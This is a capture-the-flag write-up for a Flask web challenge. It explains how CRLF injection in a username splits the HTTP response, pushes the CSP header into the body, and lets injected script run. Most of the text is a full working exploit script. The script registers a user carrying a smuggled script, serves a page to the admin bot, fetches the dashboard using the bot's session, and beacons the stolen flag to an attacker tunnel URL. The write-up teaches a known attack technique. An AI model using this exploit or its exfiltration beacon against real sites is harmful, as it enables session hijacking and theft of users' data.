# Bookmarks - CTF Writeup

## Challenge Overview

**Category:** Web Exploitation
**Techniques:** CRLF Injection, HTTP Response Splitting, CSP Bypass, XSS

## Initial Analysis

We're given a Flask web application with the following structure:

```
Bookmarks/
├── docker-compose.yaml
├── src-bot/
│   ├── bot.py
│   ├── Dockerfile
│   └── requirements.txt
└── src-web/
    ├── app.py
    ├── Dockerfile
    ├── requirements.txt
    ├── static/
    │   └── style.css
    └── templates/
        ├── base.html
        ├── dashboard.html
        ├── index.html
        ├── login.html
        ├── register.html
        └── report.html
```

## Source Code Analysis

### Bot Behavior (`bot.py`)

```python
FLAG = os.getenv("FLAG", "ctf{REDACTED}")

def visit_web(url):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()

        try:
            # Visit your URL first
            page.goto(url)
            time.sleep(5)

            # Register and log as admin
            page.goto(BOT_VISIT + '/register')
            page.fill("input[name='username']", FLAG)  # <-- FLAG is the username!
            page.fill("input[name='password']", "password")
            page.click("input[type='submit']")
            time.sleep(1)

            page.goto(BOT_VISIT + '/login')
            page.fill("input[name='username']", FLAG)
            page.fill("input[name='password']", "password")
            page.click("input[type='submit']")
            time.sleep(1)

            # Do some admin stuff
            time.sleep(5)
        except Exception as e:
            print(f"[BOT] Failed to visit {url}: {e}")
```

**Key observations:**
1. The bot visits our URL first, then waits 5 seconds
2. The bot registers and logs in with **FLAG as the username**
3. After login, the bot's session cookie is set

### Web Application (`app.py`)

```python
@app.after_request
def add_csp_header(response):
    response.headers['Content-Security-Policy'] = "default-src 'none'; style-src 'self';"
    return response

@app.route("/dashboard", methods=['GET'])
def dashboard():
    user_id = session.get("user_id")
    if not user_id:
        return "User not logged", 400

    username = None
    with sqlite3.connect(DB_NAME) as conn:
        cur = conn.execute("SELECT username FROM users WHERE id = ?", (user_id,))
        user = cur.fetchone()
        username = user[0] if user else None

    rendered = render_template("dashboard.html", username=username)
    response = make_response(rendered)
    response.headers['X-User-' + username] = user_id  # <-- VULNERABILITY!

    return response
```

**Key observations:**
1. Strict CSP: `default-src 'none'; style-src 'self';` - blocks all scripts!
2. The username is inserted directly into a **response header name**: `X-User-{username}`
3. The dashboard template displays: `Welcome, {{ username }}!`

## Vulnerability: CRLF Header Injection

The vulnerability is in this line:
```python
response.headers['X-User-' + username] = user_id
```

If the username contains CRLF characters (`\r\n`), we can:
1. End the current header
2. Inject new headers
3. End all headers with `\r\n\r\n`
4. Inject arbitrary HTML/JavaScript into the response body

### Testing CRLF Injection

```python
# Payload
username = "test\r\n\r\n<h1>INJECTED</h1><!--"
```

**Result:**
```http
HTTP/1.1 200 OK
X-User-test

<h1>INJECTED</h1><!--: 12345
Content-Security-Policy: default-src 'none'; style-src 'self';
...rest of response...
```

**Critical insight:** The CSP header ends up **in the response body**, not as an actual header! This means **CSP is not enforced** and we can execute JavaScript.

## Exploitation Strategy

### The Challenge

1. We need to steal the FLAG
2. FLAG appears as the username in "Welcome, {FLAG}!" on `/dashboard`
3. Bot logs in as FLAG after visiting our page
4. We need to somehow read the bot's dashboard

### Failed Approaches

**Attempt 1: Read `window.opener.document`**
- Our page opens a popup, logs in as our CRLF user, navigates to `/dashboard`
- Our injected script tries to read `window.opener.document` (the bot's main tab)
- **Result:** `SecurityError` - cross-origin access blocked permanently once opener navigates

### Winning Approach: Shared Session Cookies

**Key insight:** The popup window and the main tab share the same cookie jar!

After the bot logs in as FLAG:
1. The session cookie is set for `http://web` domain
2. Our popup is also on `http://web` domain (via CRLF injection)
3. Our script can `fetch("/dashboard")` using the **bot's session**
4. The response contains "Welcome, FLAG!"

### Attack Flow

```
Timeline:
0s    - Bot visits our exploit page
0s    - We open popup, login as CRLF user, navigate to /dashboard
2s    - Popup loads /dashboard with our injected script (CSP bypassed!)
5s    - Bot navigates main tab to /register, registers as FLAG
6s    - Bot navigates to /login, logs in as FLAG (session cookie set!)
7s    - Bot's session cookie is now active
8-12s - Our injected script fetches /dashboard → sees "Welcome, FLAG!"
```

## Final Exploit

```python
#!/usr/bin/env python3
"""
Bookmarks CTF - Final Exploit
"""
import http.server
import socketserver
import requests
import base64
import threading
import time
import random
import string
from urllib.parse import urlparse, parse_qs

# ================= CONFIGURATION =================
TARGET_URL = "http://65.109.202.184"
INTERNAL_ORIGIN = "http://web"
TUNNEL_URL = "https://your-tunnel-url.trycloudflare.com"  # Your tunnel
LOCAL_PORT = 8000
# =================================================

RANDOM_SUFFIX = ''.join(random.choices(string.ascii_lowercase, k=4))

def build_malicious_username():
    # Injected script that fetches /dashboard after bot logs in
    script = f"""
var T="{TUNNEL_URL}";
function P(m){{new Image().src=T+"/c?m="+encodeURIComponent(m);}}
P("A");
function go(){{
P("F");
fetch("/dashboard").then(function(r){{return r.text();}}).then(function(h){{
P("H");
var m=h.match(/Welcome,([^<]+)/);
if(m)P("W:"+m[1].trim());
else P("X:"+h.substr(0,100));
}}).catch(function(e){{P("E:"+e);}});
}}
setTimeout(go,8000);
setTimeout(go,10000);
setTimeout(go,12000);
P("B");
""".replace("\n", "")

    # CRLF payload: end headers, inject script
    return f"u{RANDOM_SUFFIX}\r\n\r\n<script>{script}</script><!--"


MALICIOUS_USERNAME = build_malicious_username()
PASSWORD = "pwned123"


class Handler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        qs = parse_qs(parsed.query)

        # Callback endpoint - receives data from injected script
        if path == "/c":
            msg = qs.get("m", [""])[0]
            print(f"[>] {msg}")
            self.send_response(200)
            self.end_headers()
            return

        # Main exploit page
        if path in ("/", "/exploit.html"):
            b64_user = base64.b64encode(MALICIOUS_USERNAME.encode()).decode()

            html = f"""<!DOCTYPE html><html><body><script>
var T="{TUNNEL_URL}";
function P(m){{new Image().src=T+"/c?m="+encodeURIComponent(m);}}
P("1");

// Open popup window
var p=window.open("about:blank","x");
P(p?"2":"2F");

// Create login form for our CRLF user
var f=document.createElement("form");
f.method="POST";
f.action="{INTERNAL_ORIGIN}/login";
f.target="x";

var u=document.createElement("textarea");
u.name="username";
u.value=atob("{b64_user}");

var w=document.createElement("input");
w.name="password";
w.value="{PASSWORD}";

f.appendChild(u);
f.appendChild(w);
document.body.appendChild(f);
f.submit();
P("3");

// Navigate popup to /dashboard (triggers CRLF injection)
setTimeout(function(){{
    P("4");
    if(p) p.location="{INTERNAL_ORIGIN}/dashboard";
}}, 2000);
</script></body></html>"""

            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(html.encode())
            print("[+] Served exploit.html")
            return

        self.send_response(200)
        self.end_headers()


def main():
    # Step 1: Register our CRLF-injected user
    print("[1] Registering CRLF user...")
    r = requests.post(f"{TARGET_URL}/register",
                      data={"username": MALICIOUS_USERNAME, "password": PASSWORD},
                      timeout=10)
    print(f"    Status: {r.status_code}")

    # Step 2: Verify injection works
    print("[2] Verifying injection...")
    s = requests.Session()
    s.post(f"{TARGET_URL}/login",
           data={"username": MALICIOUS_USERNAME, "password": PASSWORD},
           timeout=10)
    r = s.get(f"{TARGET_URL}/dashboard", timeout=10)

    if "<script>" in r.text:
        print("    [+] CRLF injection verified!")
    else:
        print("    [-] Injection failed!")
        return

    # Step 3: Start exploit server
    print("[3] Starting server...")
    server = socketserver.TCPServer(("0.0.0.0", LOCAL_PORT), Handler)
    server.allow_reuse_address = True
    threading.Thread(target=server.serve_forever, daemon=True).start()

    # Step 4: Trigger bot
    print("[4] Triggering bot...")
    r = requests.post(f"{TARGET_URL}/report",
                      data={"url": f"{TUNNEL_URL}/exploit.html"},
                      timeout=15)
    print(f"    Status: {r.status_code}")

    print("\n[*] Waiting for flag... (expect W:FLAG after ~10s)\n")

    while True:
        time.sleep(1)


if __name__ == "__main__":
    main()
```

## Running the Exploit

1. **Start a tunnel** (cloudflared is most reliable):
   ```bash
   ./cloudflared tunnel --url http://localhost:8000
   ```

2. **Update `TUNNEL_URL`** in the script with your tunnel URL

3. **Run the exploit**:
   ```bash
   python3 exploit.py
   ```

4. **Watch for the flag**:
   ```
   [>] 1
   [>] 2
   [>] 3
   [>] 4
   [>] A
   [>] B
   [>] F
   [>] H
   [>] W:FLAG{...}
   ```

## Summary

| Step | Technique |
|------|-----------|
| 1 | CRLF injection in username to bypass CSP |
| 2 | HTTP Response Splitting pushes CSP header into body |
| 3 | Inject `<script>` tag that executes (no CSP enforcement) |
| 4 | Exploit shared session cookies between windows |
| 5 | `fetch("/dashboard")` after bot logs in to steal flag |

## Key Takeaways

1. **CRLF injection** can completely bypass CSP by pushing security headers into the response body
2. **Same-origin windows share cookies** - even if you can't read `window.opener.document`, you can still make authenticated requests
3. **Timing is critical** - the script must wait for the bot to log in before fetching
4. When `window.opener` access fails with `SecurityError`, consider alternative approaches like `fetch()` with shared cookies

## Flag

```
FLAG{...}
```
